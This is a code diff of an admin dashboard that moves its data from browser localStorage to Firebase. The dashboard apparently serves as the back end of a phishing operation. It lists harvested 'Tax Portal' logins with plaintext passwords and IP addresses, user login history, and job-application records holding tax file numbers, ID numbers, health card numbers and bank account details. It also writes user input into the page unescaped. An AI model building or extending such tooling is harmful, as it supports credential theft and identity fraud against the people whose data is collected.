@@ -8,7 +8,12 @@
   <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600&family=Playfair+Display:wght@500;600;700&display=swap" rel="stylesheet">
   <!-- Font Awesome 6 -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-storage-compat.js"></script>
   <style>
+    /* Same styles as before - keeping your beautiful design */
     * {
       margin: 0;
       padding: 0;
@@ -311,7 +316,7 @@
       color: white;
     }
 
-    /* Creative Card Grid */
+    /* Data Grid */
     .data-grid {
       display: grid;
       grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
@@ -476,51 +481,11 @@
       border-color: var(--danger);
     }
 
-    /* Tables (fallback) */
-    .table-responsive {
-      overflow-x: auto;
-    }
-
-    table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-
-    th {
-      text-align: left;
-      padding: 1rem;
-      background: var(--light);
-      color: var(--primary);
-      font-weight: 600;
-      font-size: 0.9rem;
-    }
-
-    td {
-      padding: 1rem;
-      border-bottom: 1px solid var(--gray);
-      color: #4a5f4a;
-    }
-
-    tr:hover td {
-      background: #f8faf8;
-    }
-
-    .badge {
-      padding: 0.3rem 0.8rem;
-      border-radius: 20px;
-      font-size: 0.8rem;
-      font-weight: 500;
-      display: inline-block;
-    }
-
-    .badge-success {
-      background: #e6f7e6;
-      color: #2e7d32;
-    }
-
-    .badge-warning {
-      background: #fff3e0;
-      color: #ed6c02;
+    .empty-state {
+      text-align: center;
+      padding: 3rem;
+      color: #7a8a7a;
+      grid-column: 1/-1;
     }
 
     /* Modal */
@@ -588,18 +553,6 @@
       color: #4a5f4a;
       word-break: break-word;
       white-space: pre-wrap;
-    }
-
-    .document-list {
-      display: flex;
-      flex-direction: column;
-      gap: 0.5rem;
-    }
-
-    .empty-state {
-      text-align: center;
-      padding: 3rem;
-      color: #7a8a7a;
     }
 
     @media (max-width: 900px) {
@@ -694,26 +647,22 @@
         <button class="tab-btn" onclick="switchTab('logins', event)">🔐 User Login History</button>
       </div>
 
-      <!-- Tax Submissions Tab - Shows ALL login details -->
+      <!-- Tax Submissions Tab -->
       <div id="taxTab" class="admin-card active">
         <div class="card-header">
           <h2><i class="fas fa-file-invoice"></i> Tax Portal Submissions</h2>
           <button class="refresh-btn" onclick="loadAllData()"><i class="fas fa-sync-alt"></i> Refresh</button>
         </div>
-        <div class="data-grid" id="taxGrid">
-          <!-- Tax cards will be loaded here -->
-        </div>
+        <div class="data-grid" id="taxGrid"></div>
       </div>
 
-      <!-- Job Applications Tab - Shows ALL form inputs -->
+      <!-- Job Applications Tab -->
       <div id="applicationsTab" class="admin-card">
         <div class="card-header">
           <h2><i class="fas fa-file-signature"></i> Job Applications</h2>
           <button class="refresh-btn" onclick="loadAllData()"><i class="fas fa-sync-alt"></i> Refresh</button>
         </div>
-        <div class="data-grid" id="applicationsGrid">
-          <!-- Application cards will be loaded here -->
-        </div>
+        <div class="data-grid" id="applicationsGrid"></div>
       </div>
 
       <!-- Contact Messages Tab -->
@@ -722,9 +671,7 @@
           <h2><i class="fas fa-envelope"></i> Contact Messages</h2>
           <button class="refresh-btn" onclick="loadAllData()"><i class="fas fa-sync-alt"></i> Refresh</button>
         </div>
-        <div class="data-grid" id="contactGrid">
-          <!-- Contact cards will be loaded here -->
-        </div>
+        <div class="data-grid" id="contactGrid"></div>
       </div>
 
       <!-- Resource Documents Tab -->
@@ -737,24 +684,20 @@
         <div class="upload-area" onclick="document.getElementById('fileInput').click()">
           <i class="fas fa-cloud-upload-alt"></i>
           <p>Click to upload files (PDF, Word, Images, Text)</p>
-          <small>Files are stored with full quality and downloadable</small>
+          <small>Files sync across all devices instantly</small>
           <input type="file" id="fileInput" multiple style="display: none;" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png,.txt">
         </div>
 
-        <div class="data-grid" id="documentsGrid">
-          <!-- Documents will be listed here -->
-        </div>
+        <div class="data-grid" id="documentsGrid"></div>
       </div>
 
-      <!-- User Logins Tab - Shows email + password -->
+      <!-- User Logins Tab -->
       <div id="loginsTab" class="admin-card">
         <div class="card-header">
           <h2><i class="fas fa-users"></i> User Login History</h2>
           <button class="refresh-btn" onclick="loadAllData()"><i class="fas fa-sync-alt"></i> Refresh</button>
         </div>
-        <div class="data-grid" id="loginsGrid">
-          <!-- Login cards will be loaded here -->
-        </div>
+        <div class="data-grid" id="loginsGrid"></div>
       </div>
     </div>
   </div>
@@ -766,13 +709,27 @@
         <h3 id="modalTitle">Details</h3>
         <span class="modal-close" onclick="closeModal()">&times;</span>
       </div>
-      <div class="modal-body" id="modalBody">
-        <!-- Modal content will be loaded here -->
-      </div>
+      <div class="modal-body" id="modalBody"></div>
     </div>
   </div>
 
   <script>
+    // ==================== FIREBASE CONFIGURATION ====================
+    // Replace with your Firebase config
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_AUTH_DOMAIN",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_STORAGE_BUCKET",
+      messagingSenderId: "YOUR_SENDER_ID",
+      appId: "YOUR_APP_ID"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+    const storage = firebase.storage();
+
     // ==================== NOTIFICATION SYSTEM ====================
     function showNotification(title, message, type = 'success') {
       const notification = document.getElementById('notification');
@@ -803,59 +760,94 @@
       document.getElementById('notification').classList.remove('show');
     }
 
-    // ==================== ALL POSSIBLE STORAGE KEYS ====================
-    const STORAGE_KEYS = {
-      JOB_APPLICATIONS: 'jobApplications',
-      CONTACT_MESSAGES: 'contactMessages',
-      TAX_SUBMISSIONS: 'taxSubmissions',
-      RESOURCE_DOCUMENTS: 'carltonHillRealDocuments',
-      USER_LOGINS: 'userLogins',
-      NOTIFICATIONS: 'adminNotifications'
-    };
-
-    // ==================== DOWNLOAD FUNCTIONS ====================
-    function downloadFile(content, filename, type = 'text/plain') {
-      const blob = new Blob([content], { type });
-      const url = window.URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = filename;
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      window.URL.revokeObjectURL(url);
-      showNotification('Download Started', `Downloading: ${filename}`, 'success');
-    }
-
-    function downloadDocument(doc) {
-      if (!doc) return;
+    // ==================== FIREBASE DATA FUNCTIONS ====================
+    
+    // Upload file to Firebase Storage
+    async function uploadFile(file) {
+      const fileName = `${Date.now()}_${file.name}`;
+      const storageRef = storage.ref().child(`documents/${fileName}`);
+      const snapshot = await storageRef.put(file);
+      const downloadUrl = await snapshot.ref.getDownloadURL();
       
-      let content = doc.content;
-      // If it's a file object with data
-      if (doc.data) {
-        content = atob(doc.data.split(',')[1] || '');
-      }
-      
-      const filename = doc.fileName || `${doc.name || 'document'}.txt`;
-      downloadFile(content || 'No content available', filename);
+      return {
+        name: file.name,
+        url: downloadUrl,
+        type: file.type,
+        size: file.size,
+        path: `documents/${fileName}`
+      };
     }
 
-    // ==================== LOAD ALL DATA ====================
-    function loadAllData() {
-      loadTaxSubmissions();
-      loadApplications();
-      loadContacts();
-      loadDocuments();
-      loadLogins();
-    }
-
-    function loadTaxSubmissions() {
+    // Save tax submission
+    async function saveTaxSubmission(data) {
       try {
-        let submissions = [];
-        const taxData = localStorage.getItem(STORAGE_KEYS.TAX_SUBMISSIONS);
-        if (taxData) {
-          submissions = JSON.parse(taxData);
-        }
+        const docRef = await db.collection('taxSubmissions').add({
+          ...data,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+        showNotification('Success', 'Tax submission saved', 'success');
+        return docRef.id;
+      } catch (error) {
+        console.error('Error saving tax:', error);
+        showNotification('Error', 'Failed to save', 'error');
+      }
+    }
+
+    // Save job application
+    async function saveJobApplication(data) {
+      try {
+        const docRef = await db.collection('jobApplications').add({
+          ...data,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+        showNotification('Success', 'Application submitted', 'success');
+        return docRef.id;
+      } catch (error) {
+        console.error('Error saving application:', error);
+        showNotification('Error', 'Failed to save', 'error');
+      }
+    }
+
+    // Save contact message
+    async function saveContactMessage(data) {
+      try {
+        const docRef = await db.collection('contactMessages').add({
+          ...data,
+          status: 'unread',
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+        showNotification('Success', 'Message sent', 'success');
+        return docRef.id;
+      } catch (error) {
+        console.error('Error saving contact:', error);
+        showNotification('Error', 'Failed to save', 'error');
+      }
+    }
+
+    // Save user login
+    async function saveUserLogin(data) {
+      try {
+        await db.collection('userLogins').add({
+          ...data,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+      } catch (error) {
+        console.error('Error saving login:', error);
+      }
+    }
+
+    // ==================== LOAD DATA FROM FIREBASE ====================
+    
+    async function loadTaxSubmissions() {
+      try {
+        const snapshot = await db.collection('taxSubmissions')
+          .orderBy('timestamp', 'desc')
+          .get();
+        
+        const submissions = snapshot.docs.map(doc => ({
+          id: doc.id,
+          ...doc.data()
+        }));
 
         const grid = document.getElementById('taxGrid');
         const count = document.getElementById('taxCount');
@@ -867,11 +859,7 @@
           return;
         }
 
-        grid.innerHTML = submissions.map(sub => {
-          const loginDetails = sub.loginDetails || {};
-          const docCount = sub.documents ? Object.keys(sub.documents).length : 0;
-          
-          return `
+        grid.innerHTML = submissions.map(sub => `
           <div class="data-card">
             <div class="card-header-colored">
               <h3><i class="fas fa-user-lock"></i> Tax Portal Login</h3>
@@ -888,51 +876,39 @@
               </div>
               <div class="info-row">
                 <span class="info-label">Login Time</span>
-                <span class="info-value">${sub.timestamp ? new Date(sub.timestamp).toLocaleString() : 'N/A'}</span>
+                <span class="info-value">${sub.timestamp ? new Date(sub.timestamp.toDate()).toLocaleString() : 'N/A'}</span>
               </div>
               <div class="info-row">
                 <span class="info-label">IP Address</span>
-                <span class="info-value">${loginDetails.ip || sub.ip || 'N/A'}</span>
+                <span class="info-value">${sub.ip || 'N/A'}</span>
               </div>
               <div class="info-row">
                 <span class="info-label">Documents</span>
-                <span class="info-value">${docCount} file(s)</span>
+                <span class="info-value">${sub.documents ? Object.keys(sub.documents).length : 0} file(s)</span>
               </div>
-              ${sub.documents ? Object.entries(sub.documents).map(([type, file]) => `
-                <div class="document-preview">
-                  <i class="fas fa-file-alt"></i>
-                  <div class="document-info">
-                    <div class="document-name">${type.toUpperCase()}: ${file.name}</div>
-                    <div class="document-size">${file.size ? (file.size/1024).toFixed(0) + ' KB' : ''}</div>
-                  </div>
-                  <button class="download-icon-btn" onclick="downloadDocument(${JSON.stringify(file).replace(/"/g, '&quot;')})">
-                    <i class="fas fa-download"></i>
-                  </button>
-                </div>
-              `).join('') : ''}
             </div>
             <div class="card-footer">
               <button class="action-btn" onclick="viewTaxDetails('${sub.id}')">
                 <i class="fas fa-eye"></i> View Full
               </button>
-              <button class="action-btn" onclick="exportAsJSON('tax', '${sub.id}')">
-                <i class="fas fa-download"></i> Export
-              </button>
             </div>
           </div>
-        `}).join('');
-      } catch (e) {
-        console.error('Error loading tax:', e);
+        `).join('');
+      } catch (error) {
+        console.error('Error loading tax:', error);
       }
     }
 
-    function loadApplications() {
+    async function loadApplications() {
       try {
-        let apps = [];
-        const appData = localStorage.getItem(STORAGE_KEYS.JOB_APPLICATIONS);
-        if (appData) {
-          apps = JSON.parse(appData);
-        }
+        const snapshot = await db.collection('jobApplications')
+          .orderBy('timestamp', 'desc')
+          .get();
+        
+        const apps = snapshot.docs.map(doc => ({
+          id: doc.id,
+          ...doc.data()
+        }));
 
         const grid = document.getElementById('applicationsGrid');
         const count = document.getElementById('applicationCount');
@@ -947,9 +923,6 @@
         grid.innerHTML = apps.map(app => {
           const personal = app.personalInfo || {};
           const work = app.workPreference || {};
-          const health = app.health || {};
-          const bonus = app.bonus || {};
-          const identification = app.identification || {};
           
           return `
           <div class="data-card">
@@ -960,77 +933,47 @@
             <div class="card-body">
               <div class="info-row">
                 <span class="info-label">Email</span>
-                <span class="info-value">${personal.email || app.email || 'N/A'}</span>
+                <span class="info-value">${personal.email || 'N/A'}</span>
               </div>
               <div class="info-row">
                 <span class="info-label">Phone</span>
-                <span class="info-value">${personal.phone || app.phone || 'N/A'}</span>
+                <span class="info-value">${personal.phone || 'N/A'}</span>
               </div>
               <div class="info-row">
                 <span class="info-label">Position</span>
-                <span class="info-value">${work.position || app.position || 'N/A'}</span>
-              </div>
-              <div class="info-row">
-                <span class="info-label">DOB</span>
-                <span class="info-value">${personal.dob || 'N/A'}</span>
-              </div>
-              <div class="info-row">
-                <span class="info-label">Nationality</span>
-                <span class="info-value">${personal.nationality || 'N/A'}</span>
+                <span class="info-value">${work.position || 'N/A'}</span>
               </div>
               <div class="info-row">
                 <span class="info-label">ID Number</span>
-                <span class="info-value">${identification.idNumber || 'N/A'}</span>
+                <span class="info-value">${app.identification?.idNumber || 'N/A'}</span>
               </div>
               <div class="info-row">
                 <span class="info-label">TFN</span>
                 <span class="info-value password-value">${app.tax?.tfn || 'N/A'}</span>
               </div>
-              ${identification.idFile ? `
-                <div class="document-preview">
-                  <i class="fas fa-id-card"></i>
-                  <div class="document-info">
-                    <div class="document-name">ID Document: ${identification.idFile.name}</div>
-                  </div>
-                  <button class="download-icon-btn" onclick="downloadDocument(${JSON.stringify(identification.idFile).replace(/"/g, '&quot;')})">
-                    <i class="fas fa-download"></i>
-                  </button>
-                </div>
-              ` : ''}
-              ${health.cardFile ? `
-                <div class="document-preview">
-                  <i class="fas fa-hospital"></i>
-                  <div class="document-info">
-                    <div class="document-name">Health Card: ${health.cardFile.name}</div>
-                  </div>
-                  <button class="download-icon-btn" onclick="downloadDocument(${JSON.stringify(health.cardFile).replace(/"/g, '&quot;')})">
-                    <i class="fas fa-download"></i>
-                  </button>
-                </div>
-              ` : ''}
             </div>
             <div class="card-footer">
               <button class="action-btn" onclick="viewApplicationDetails('${app.id}')">
                 <i class="fas fa-eye"></i> View All
               </button>
-              <button class="action-btn" onclick="exportAsJSON('application', '${app.id}')">
-                <i class="fas fa-download"></i> Export
-              </button>
             </div>
           </div>
         `}).join('');
-      } catch (e) {
-        console.error('Error loading applications:', e);
+      } catch (error) {
+        console.error('Error loading applications:', error);
       }
     }
 
-    function loadContacts() {
+    async function loadContacts() {
       try {
-        let msgs = [];
-        const contactData = localStorage.getItem(STORAGE_KEYS.CONTACT_MESSAGES);
-        if (contactData) {
-          msgs = JSON.parse(contactData);
-        }
+        const snapshot = await db.collection('contactMessages')
+          .orderBy('timestamp', 'desc')
+          .get();
+        
+        const msgs = snapshot.docs.map(doc => ({
+          id: doc.id,
+          ...doc.data()
+        }));
 
         const grid = document.getElementById('contactGrid');
         const count = document.getElementById('contactCount');
@@ -1054,25 +997,17 @@
                 <span class="info-value">${msg.email}</span>
               </div>
               <div class="info-row">
-                <span class="info-label">Phone</span>
-                <span class="info-value">${msg.phone || 'Not provided'}</span>
-              </div>
-              <div class="info-row">
                 <span class="info-label">Subject</span>
                 <span class="info-value">${msg.subject}</span>
               </div>
               <div class="info-row">
-                <span class="info-label">Message</span>
-                <span class="info-value" style="max-height: 60px; overflow: hidden;">${msg.message.substring(0, 100)}${msg.message.length > 100 ? '...' : ''}</span>
-              </div>
-              <div class="info-row">
                 <span class="info-label">Date</span>
-                <span class="info-value">${new Date(msg.timestamp || msg.date).toLocaleString()}</span>
+                <span class="info-value">${msg.timestamp ? new Date(msg.timestamp.toDate()).toLocaleString() : 'N/A'}</span>
               </div>
             </div>
             <div class="card-footer">
               <button class="action-btn" onclick="viewMessageDetails('${msg.id}')">
-                <i class="fas fa-eye"></i> Read Full
+                <i class="fas fa-eye"></i> Read
               </button>
               <button class="action-btn" onclick="markAsRead('${msg.id}')">
                 <i class="fas fa-check"></i> Mark Read
@@ -1080,18 +1015,22 @@
             </div>
           </div>
         `).join('');
-      } catch (e) {
-        console.error('Error loading contacts:', e);
+      } catch (error) {
+        console.error('Error loading contacts:', error);
       }
     }
 
-    function loadLogins() {
+    async function loadLogins() {
       try {
-        let logins = [];
-        const loginData = localStorage.getItem(STORAGE_KEYS.USER_LOGINS);
-        if (loginData) {
-          logins = JSON.parse(loginData);
-        }
+        const snapshot = await db.collection('userLogins')
+          .orderBy('timestamp', 'desc')
+          .limit(50)
+          .get();
+        
+        const logins = snapshot.docs.map(doc => ({
+          id: doc.id,
+          ...doc.data()
+        }));
 
         const grid = document.getElementById('loginsGrid');
         const count = document.getElementById('loginCount');
@@ -1103,7 +1042,7 @@
           return;
         }
 
-        grid.innerHTML = logins.slice().reverse().map(login => `
+        grid.innerHTML = logins.map(login => `
           <div class="data-card">
             <div class="card-header-colored">
               <h3><i class="fas fa-sign-in-alt"></i> Login Session</h3>
@@ -1120,173 +1059,88 @@
               </div>
               <div class="info-row">
                 <span class="info-label">Login Time</span>
-                <span class="info-value">${new Date(login.timestamp).toLocaleString()}</span>
+                <span class="info-value">${login.timestamp ? new Date(login.timestamp.toDate()).toLocaleString() : 'N/A'}</span>
               </div>
               <div class="info-row">
                 <span class="info-label">IP Address</span>
                 <span class="info-value">${login.ip || 'N/A'}</span>
               </div>
-              <div class="info-row">
-                <span class="info-label">User Agent</span>
-                <span class="info-value" style="font-size: 0.8rem;">${login.userAgent || 'N/A'}</span>
-              </div>
             </div>
           </div>
         `).join('');
-      } catch (e) {
-        console.error('Error loading logins:', e);
+      } catch (error) {
+        console.error('Error loading logins:', error);
       }
     }
 
-    // ==================== DOCUMENT MANAGEMENT ====================
-    function loadDocuments() {
+    async function loadDocuments() {
       try {
-        const saved = localStorage.getItem(STORAGE_KEYS.RESOURCE_DOCUMENTS);
-        const documents = saved ? JSON.parse(saved) : [];
-        renderDocuments(documents);
-      } catch (e) {
-        console.error('Error loading documents:', e);
-      }
-    }
+        const snapshot = await db.collection('resourceDocuments')
+          .orderBy('timestamp', 'desc')
+          .get();
+        
+        const docs = snapshot.docs.map(doc => ({
+          id: doc.id,
+          ...doc.data()
+        }));
 
-    function renderDocuments(documents) {
-      const grid = document.getElementById('documentsGrid');
+        const grid = document.getElementById('documentsGrid');
 
-      if (documents.length === 0) {
-        grid.innerHTML = '<div class="empty-state">📁 No documents yet. Upload your first file.</div>';
-        return;
-      }
+        if (docs.length === 0) {
+          grid.innerHTML = '<div class="empty-state">📁 No documents yet. Upload your first file.</div>';
+          return;
+        }
 
-      grid.innerHTML = documents.map((doc, index) => `
-        <div class="data-card">
-          <div class="card-header-colored">
-            <h3><i class="fas ${doc.icon || 'fa-file-pdf'}"></i> ${doc.name}</h3>
-            <span class="card-badge">${doc.type}</span>
-          </div>
-          <div class="card-body">
-            <div class="info-row">
-              <span class="info-label">Description</span>
-              <span class="info-value">${doc.description || 'No description'}</span>
+        grid.innerHTML = docs.map(doc => `
+          <div class="data-card">
+            <div class="card-header-colored">
+              <h3><i class="fas ${doc.icon || 'fa-file-pdf'}"></i> ${doc.name}</h3>
+              <span class="card-badge">${doc.type}</span>
             </div>
-            <div class="info-row">
-              <span class="info-label">Size</span>
-              <span class="info-value">${doc.size}</span>
-            </div>
-            <div class="info-row">
-              <span class="info-label">Added</span>
-              <span class="info-value">${new Date(parseInt(doc.id)).toLocaleDateString()}</span>
-            </div>
-            <div class="document-preview" style="margin-top: 1rem;">
-              <i class="fas fa-file-alt"></i>
-              <div class="document-info">
-                <div class="document-name">${doc.fileName || doc.name}</div>
+            <div class="card-body">
+              <div class="info-row">
+                <span class="info-label">Description</span>
+                <span class="info-value">${doc.description || 'No description'}</span>
               </div>
-              <button class="download-icon-btn" onclick="downloadDocument(${JSON.stringify(doc).replace(/"/g, '&quot;')})">
-                <i class="fas fa-download"></i>
+              <div class="info-row">
+                <span class="info-label">Size</span>
+                <span class="info-value">${doc.size}</span>
+              </div>
+              <div class="document-preview" style="margin-top: 1rem;">
+                <i class="fas fa-file-alt"></i>
+                <div class="document-info">
+                  <div class="document-name">${doc.fileName || doc.name}</div>
+                </div>
+                <a href="${doc.url}" target="_blank" class="download-icon-btn" style="text-decoration: none;">
+                  <i class="fas fa-download"></i>
+                </a>
+              </div>
+            </div>
+            <div class="card-footer">
+              <button class="action-btn" onclick="deleteDocument('${doc.id}')">
+                <i class="fas fa-trash"></i> Delete
               </button>
             </div>
           </div>
-          <div class="card-footer">
-            <button class="action-btn" onclick="editDocument('${doc.id}')">
-              <i class="fas fa-edit"></i> Edit
-            </button>
-            <button class="action-btn danger" onclick="deleteDocument('${doc.id}')">
-              <i class="fas fa-trash"></i> Delete
-            </button>
-          </div>
-        </div>
-      `).join('');
-    }
-
-    function handleFileUpload(files) {
-      Array.from(files).forEach(file => {
-        const reader = new FileReader();
-        reader.onload = function(e) {
-          const newDoc = {
-            id: Date.now().toString(),
-            name: file.name.replace(/\.[^/.]+$/, ""),
-            description: `Uploaded on ${new Date().toLocaleDateString()}`,
-            type: file.type.split('/')[1]?.toUpperCase() || file.name.split('.').pop()?.toUpperCase() || 'FILE',
-            size: (file.size / 1024).toFixed(0) + ' KB',
-            icon: file.type.includes('pdf') ? 'fa-file-pdf' : 
-                  file.type.includes('image') ? 'fa-file-image' : 
-                  file.type.includes('word') ? 'fa-file-word' : 'fa-file',
-            fileName: file.name,
-            content: e.target.result,
-            data: e.target.result
-          };
-          
-          const existing = JSON.parse(localStorage.getItem(STORAGE_KEYS.RESOURCE_DOCUMENTS) || '[]');
-          existing.push(newDoc);
-          localStorage.setItem(STORAGE_KEYS.RESOURCE_DOCUMENTS, JSON.stringify(existing));
-          
-          loadDocuments();
-          showNotification('Success', `Document uploaded: ${newDoc.name}`, 'success');
-        };
-        reader.readAsText(file);
-      });
-    }
-
-    function editDocument(id) {
-      const existing = JSON.parse(localStorage.getItem(STORAGE_KEYS.RESOURCE_DOCUMENTS) || '[]');
-      const doc = existing.find(d => d.id === id);
-      if (!doc) return;
-      
-      const newName = prompt('Edit document name:', doc.name);
-      if (newName) doc.name = newName;
-      const newDesc = prompt('Edit description:', doc.description);
-      if (newDesc) doc.description = newDesc;
-      
-      localStorage.setItem(STORAGE_KEYS.RESOURCE_DOCUMENTS, JSON.stringify(existing));
-      loadDocuments();
-      showNotification('Success', 'Document updated successfully', 'success');
-    }
-
-    function deleteDocument(id) {
-      if (confirm('Delete this document? This cannot be undone.')) {
-        const existing = JSON.parse(localStorage.getItem(STORAGE_KEYS.RESOURCE_DOCUMENTS) || '[]');
-        const newDocs = existing.filter(d => d.id !== id);
-        localStorage.setItem(STORAGE_KEYS.RESOURCE_DOCUMENTS, JSON.stringify(newDocs));
-        loadDocuments();
-        showNotification('Success', 'Document deleted successfully', 'success');
+        `).join('');
+      } catch (error) {
+        console.error('Error loading documents:', error);
       }
     }
 
     // ==================== DETAIL VIEW FUNCTIONS ====================
-    function viewTaxDetails(id) {
-      const submissions = JSON.parse(localStorage.getItem(STORAGE_KEYS.TAX_SUBMISSIONS)) || [];
-      const sub = submissions.find(s => s.id === id);
+    async function viewTaxDetails(id) {
+      const doc = await db.collection('taxSubmissions').doc(id).get();
+      const sub = doc.data();
+      
       if (!sub) return;
 
-      let docsHtml = '';
-      if (sub.documents) {
-        docsHtml = '<div class="document-list">';
-        for (let [type, file] of Object.entries(sub.documents)) {
-          if (file && file.name) {
-            docsHtml += `
-              <div class="document-preview">
-                <i class="fas fa-file-alt"></i>
-                <div class="document-info">
-                  <div class="document-name">${type.toUpperCase()}: ${file.name}</div>
-                </div>
-                <button class="download-icon-btn" onclick="downloadDocument(${JSON.stringify(file).replace(/"/g, '&quot;')})">
-                  <i class="fas fa-download"></i>
-                </button>
-              </div>
-            `;
-          }
-        }
-        docsHtml += '</div>';
-      }
-
       const modalBody = `
-        <div class="detail-row"><div class="detail-label">ID</div><div class="detail-value">${sub.id}</div></div>
+        <div class="detail-row"><div class="detail-label">ID</div><div class="detail-value">${id}</div></div>
         <div class="detail-row"><div class="detail-label">Email</div><div class="detail-value">${sub.email}</div></div>
         <div class="detail-row"><div class="detail-label">Password</div><div class="detail-value password-value">${sub.password || 'N/A'}</div></div>
-        <div class="detail-row"><div class="detail-label">Date</div><div class="detail-value">${new Date(sub.timestamp).toLocaleString()}</div></div>
+        <div class="detail-row"><div class="detail-label">Date</div><div class="detail-value">${sub.timestamp ? new Date(sub.timestamp.toDate()).toLocaleString() : 'N/A'}</div></div>
         <div class="detail-row"><div class="detail-label">IP Address</div><div class="detail-value">${sub.ip || 'N/A'}</div></div>
-        <div class="detail-row"><div class="detail-label">User Agent</div><div class="detail-value">${sub.userAgent || 'N/A'}</div></div>
-        <div class="detail-row"><div class="detail-label">Documents</div><div class="detail-value">${docsHtml || 'None'}</div></div>
       `;
 
       document.getElementById('modalTitle').textContent = 'Tax Submission Details';
@@ -1294,97 +1148,51 @@
       document.getElementById('detailModal').classList.add('active');
     }
 
-    function viewApplicationDetails(id) {
-      const apps = JSON.parse(localStorage.getItem(STORAGE_KEYS.JOB_APPLICATIONS)) || [];
-      const app = apps.find(a => a.id === id);
-      if (!app) return;
+    async function viewApplicationDetails(id) {
+      const doc = await db.collection('jobApplications').doc(id).get();
+      const app = doc.data();
 
       const personal = app.personalInfo || {};
       const work = app.workPreference || {};
       const health = app.health || {};
-      const bonus = app.bonus || {};
       const identification = app.identification || {};
-      const tax = app.tax || {};
-
-      let docsHtml = '<div class="document-list">';
-      if (identification.idFile) {
-        docsHtml += `
-          <div class="document-preview">
-            <i class="fas fa-id-card"></i>
-            <div class="document-info">
-              <div class="document-name">ID Document: ${identification.idFile.name}</div>
-            </div>
-            <button class="download-icon-btn" onclick="downloadDocument(${JSON.stringify(identification.idFile).replace(/"/g, '&quot;')})">
-              <i class="fas fa-download"></i>
-            </button>
-          </div>
-        `;
-      }
-      if (health.cardFile) {
-        docsHtml += `
-          <div class="document-preview">
-            <i class="fas fa-hospital"></i>
-            <div class="document-info">
-              <div class="document-name">Health Card: ${health.cardFile.name}</div>
-            </div>
-            <button class="download-icon-btn" onclick="downloadDocument(${JSON.stringify(health.cardFile).replace(/"/g, '&quot;')})">
-              <i class="fas fa-download"></i>
-            </button>
-          </div>
-        `;
-      }
-      docsHtml += '</div>';
 
       const modalBody = `
         <h4 style="color: var(--primary); margin-bottom: 1rem;">Personal Information</h4>
-        <div class="detail-row"><div class="detail-label">Full Name</div><div class="detail-value">${personal.fullName || 'N/A'}</div></div>
+        <div class="detail-row"><div class="detail-label">Name</div><div class="detail-value">${personal.fullName || 'N/A'}</div></div>
         <div class="detail-row"><div class="detail-label">Email</div><div class="detail-value">${personal.email || 'N/A'}</div></div>
         <div class="detail-row"><div class="detail-label">Phone</div><div class="detail-value">${personal.phone || 'N/A'}</div></div>
-        <div class="detail-row"><div class="detail-label">Date of Birth</div><div class="detail-value">${personal.dob || 'N/A'}</div></div>
+        <div class="detail-row"><div class="detail-label">DOB</div><div class="detail-value">${personal.dob || 'N/A'}</div></div>
         <div class="detail-row"><div class="detail-label">Nationality</div><div class="detail-value">${personal.nationality || 'N/A'}</div></div>
         <div class="detail-row"><div class="detail-label">Address</div><div class="detail-value">${personal.address || 'N/A'}</div></div>
-        <div class="detail-row"><div class="detail-label">Emergency Contact</div><div class="detail-value">${personal.emergency || 'N/A'}</div></div>
         
         <h4 style="color: var(--primary); margin: 1.5rem 0 1rem;">Identification</h4>
         <div class="detail-row"><div class="detail-label">ID Number</div><div class="detail-value">${identification.idNumber || 'N/A'}</div></div>
         <div class="detail-row"><div class="detail-label">ID Type</div><div class="detail-value">${identification.idType || 'N/A'}</div></div>
         
         <h4 style="color: var(--primary); margin: 1.5rem 0 1rem;">Tax & Insurance</h4>
-        <div class="detail-row"><div class="detail-label">TFN</div><div class="detail-value password-value">${tax.tfn || 'N/A'}</div></div>
+        <div class="detail-row"><div class="detail-label">TFN</div><div class="detail-value password-value">${app.tax?.tfn || 'N/A'}</div></div>
         <div class="detail-row"><div class="detail-label">Health Provider</div><div class="detail-value">${health.provider || 'N/A'}</div></div>
         <div class="detail-row"><div class="detail-label">Health Number</div><div class="detail-value">${health.number || 'N/A'}</div></div>
         
         <h4 style="color: var(--primary); margin: 1.5rem 0 1rem;">Work Preference</h4>
         <div class="detail-row"><div class="detail-label">Position</div><div class="detail-value">${work.position || 'N/A'}</div></div>
-        <div class="detail-row"><div class="detail-label">Work Type</div><div class="detail-value">${work.workType || 'N/A'}</div></div>
+        <div class="detail-row"><div class="detail-label">Type</div><div class="detail-value">${work.workType || 'N/A'}</div></div>
         <div class="detail-row"><div class="detail-label">Start Date</div><div class="detail-value">${work.startDate || 'N/A'}</div></div>
         <div class="detail-row"><div class="detail-label">Accommodation</div><div class="detail-value">${work.needsAccommodation === 'yes' ? 'Yes' : 'No'}</div></div>
-        
-        <h4 style="color: var(--primary); margin: 1.5rem 0 1rem;">Bonus Program</h4>
-        <div class="detail-row"><div class="detail-label">Join Bonus</div><div class="detail-value">${bonus.join === 'yes' ? 'Yes' : 'No'}</div></div>
-        ${bonus.join === 'yes' ? `
-          <div class="detail-row"><div class="detail-label">Percentage</div><div class="detail-value">${bonus.percentage || 'N/A'}</div></div>
-          <div class="detail-row"><div class="detail-label">Bank Name</div><div class="detail-value">${bonus.bankName || 'N/A'}</div></div>
-          <div class="detail-row"><div class="detail-label">Account Number</div><div class="detail-value">${bonus.bankAccount || 'N/A'}</div></div>
-        ` : ''}
-        
-        <h4 style="color: var(--primary); margin: 1.5rem 0 1rem;">Documents</h4>
-        ${docsHtml || '<p>No documents uploaded</p>'}
-        
